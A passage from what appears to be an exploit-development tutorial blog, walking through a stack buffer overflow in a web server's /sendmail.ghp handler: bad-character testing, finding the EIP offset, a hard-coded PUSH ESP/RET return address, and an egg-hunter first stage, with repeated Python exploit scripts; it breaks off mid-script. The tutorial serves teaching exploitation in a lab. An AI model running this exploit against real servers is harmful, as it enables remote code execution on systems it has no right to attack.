&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;crash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;BadChar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4072&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;BadChar&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;EIP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4144&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4076&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;POST /sendmail.ghp HTTP/1.1 &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Email=&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;crash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;amp;getPassword=Get+Password&quot;&lt;/span&gt;

&lt;span class=&quot;no&quot;&gt;EFS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;EFS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;EFS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;EFS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;When we run it, our application crashes, and immediately we can see that our EIP contains &lt;code class=&quot;highlighter-rouge&quot;&gt;\x43\x43\x42\x42&lt;/code&gt;. Seeing as the payload lengths are the same, we can already see some characters got mangled in the stack.
If we examine the stack we can see that &lt;code class=&quot;highlighter-rouge&quot;&gt;\x25\x26\x27\x2b&lt;/code&gt; where either ommitted or replaced by another character. Lets take these out of our bad char buffer and send the payload again.&lt;/p&gt;

&lt;p&gt;Great, examining our buffer we see that once again our EIP is overwritten with B’s and our stack contains all the characters sent.&lt;/p&gt;

&lt;p&gt;2) Verify Control of EIP&lt;/p&gt;

&lt;p&gt;Back to the original exploit, We have seen we overwrote EIP with A’s, But we have also sent 4144 A’s, Any of which could
be the ones that overwrote our instruction pointer. To help us identify the exact offset, we are going to use metasploit’s pattern create. Basically, this will create a unique string of 4144 bytes in length. We can then
replace our payload with this string, and use metasploit’s pattern offset to identify the exact offset of our EIP.&lt;/p&gt;

&lt;p&gt;To generate a string, use the following command:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 4144&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Now copy and paste the output into our exploit, replacing the A’s.&lt;/p&gt;

&lt;p&gt;Restart the EFS server and launch the exploit once again. You should see the following:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/Stack/Offset.png&quot; alt=&quot;Offset, there you are.&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We see EIP is now overwritten with &lt;code class=&quot;highlighter-rouge&quot;&gt;66463766&lt;/code&gt;. To determine the offset, we will use the following command:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 4144 -q 66463766&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Which tells us the offset is 4072. Lets verify this in our exploit. Replace the payload string with 4072 instances of A plus four instances of B and fill the remainder with C’s. Our exploit should
look like the following:&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/python&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Usage: python EFS.py [IP]&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;i.e python  EFS.py 192.168.56.101&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;


&lt;span class=&quot;n&quot;&gt;crash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4072&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;B&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4144&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4076&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;POST /sendmail.ghp HTTP/1.1 &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; 
&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Email=&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;crash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;amp;getPassword=Get+Password&quot;&lt;/span&gt;

&lt;span class=&quot;no&quot;&gt;EFS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;EFS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;EFS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;EFS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Lets restart the server, attach it to immunity and fire off our exploit. Bingo! EIP has been overwritten with B’s. We now have the Offset for EIP, time to redirect execution flow.&lt;/p&gt;

&lt;p&gt;3) Redirect Execution flow to ESP&lt;/p&gt;

&lt;p&gt;Now that we have control of EIP we need to redirect exection flow. This will always depend on the program being exploited, the buffers available and the state of the registers. Unfortunately not all
overflows are exploitable, so keep this in mind when working on other exploits. For this particular exploit, we notice that we have control of the buffer at ESP, so it makes sence to redirect execution flow
there. The way we will do this is by finding the address of a “JMP ESP” or “CALL ESP” instruction, which will tell the program to go to the address of ESP for the next instruction.&lt;/p&gt;

&lt;p&gt;Three ways we can accomplish this is by finding the address of a JMP ESP, CALL ESP or PUSH ESP,RET. The JMP and the CALL work pretty much as the name suggests; JMP will completely redirect execution
to ESP, while CALL pushes the address of the EIP onto the stack and redirects execution to ESP. Upon encountering a RET instruction, it will go back to the spot before the jump.
PUSH ESP, RET is a little different. The PUSH ESP will push the address of ESP onto the stack, while the RET will load this value into EIP and redirect execution flow there.&lt;/p&gt;

&lt;p&gt;To find an address we can use, we will use Corelan’s excellent mona script for immunity. In the command box at the bottom of the debugger, we will use the following command:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;!mona jmp -r esp&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/Stack/Mona.png&quot; alt=&quot;Corelan's Mona - your new best friend&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Mona will not only go through the loaded modules and supply some addresses we can use, but it will also show us what memory protections are enabled in each module. For the purposes of this blog post
we will choose a return address from a DLL with no memory protections (we will cover these a little later). The last address presented has no memory protections enabled, is from one of the server’s dll’s,
and offers an address free of bad chars. Modify our skeleton exploit to look like the following:&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/python&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Usage: python EFS.py [IP]&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;i.e python  EFS.py 192.168.56.101&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;#push esp, ret 0x61c5203b&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;EIP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x3b\x20\xc5\x61&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;crash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4072&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;EIP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4144&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4076&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;POST /sendmail.ghp HTTP/1.1 &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; 
&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Email=&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;crash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;amp;getPassword=Get+Password&quot;&lt;/span&gt;

&lt;span class=&quot;no&quot;&gt;EFS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;EFS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;EFS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;EFS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;A few of you may have noticed the order in which I wrote the address for EIP. No, this is not a typo - The reason for writing the the address backwards has to do with the x86 architechture we are exploiting.
x86 is little endian, which refers to the order in which the bytes are stored in memory. In little endian architechture, the least significant value (in this case 3b) is stored first. We will explore this a 
little more in the shellcode section of the blog.&lt;/p&gt;

&lt;p&gt;Save the above exploit, but dont run it yet. This time we are going to follow the execution flow of our payload. To do this, lets place a breakpoint at the return address. We will do this by heading to the
dissassembly window and right clicking anywhere. Select go to &amp;gt; Expression and input our return address. When the instruction shows up right click on it and toggle a break point. This will pause the program
once execution hits this point.&lt;/p&gt;

&lt;p&gt;After we run the exploit we see something interesting. Our program no longer crashes! instead, Our EIP has been overwriten which has redirected execution flow to our breakpoint, which has paused the program.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/Stack/Breakpoint.png&quot; alt=&quot;So far so good.&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now pay close attention to the stack. If we step through our program and execute the PUSH ESP, we will see the address of ESP being pushed onto the stack. Step through it again and we now see execution redirected
to our stack of C’s! Now, the program will execute anything we place here instead of C’s.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/Stack/C.png&quot; alt=&quot;Booyaaaa&quot; /&gt;&lt;/p&gt;

&lt;p&gt;4) Use a small first stage payload to redirect execution into our Big buffer.&lt;/p&gt;

&lt;p&gt;Here is where it gets fun. We now have to choose our first stage payload. I am going to show two approaches which we will expand on in different posts.&lt;/p&gt;

&lt;p&gt;4.1 - The Egg Hunter&lt;/p&gt;

&lt;p&gt;The first approach we will discuss is using an egg hunter. An egg hunter is a piece of shellcode which will look through memory for our marker, or egg. Once it encounters this egg, it will redirect
execution flow here and execute it. In later posts we will go over different egg hunters in depth, but for now we will use metasploit to help us generate one.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/share/metasploit-framework/tools/exploit/egghunter.rb -b \x25\x26\x27\x2b -e r00t -f python&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;The b parameter denotes the bad chars. We need to define these so that metasploit knows which characters to avoid. The -e parameter is for our “egg”, or the signature that will mark the beginning of 
our second stage payload. Please note that this needs to be four bytes.&lt;/p&gt;

&lt;p&gt;We modify our exploit as follows:&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/python&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
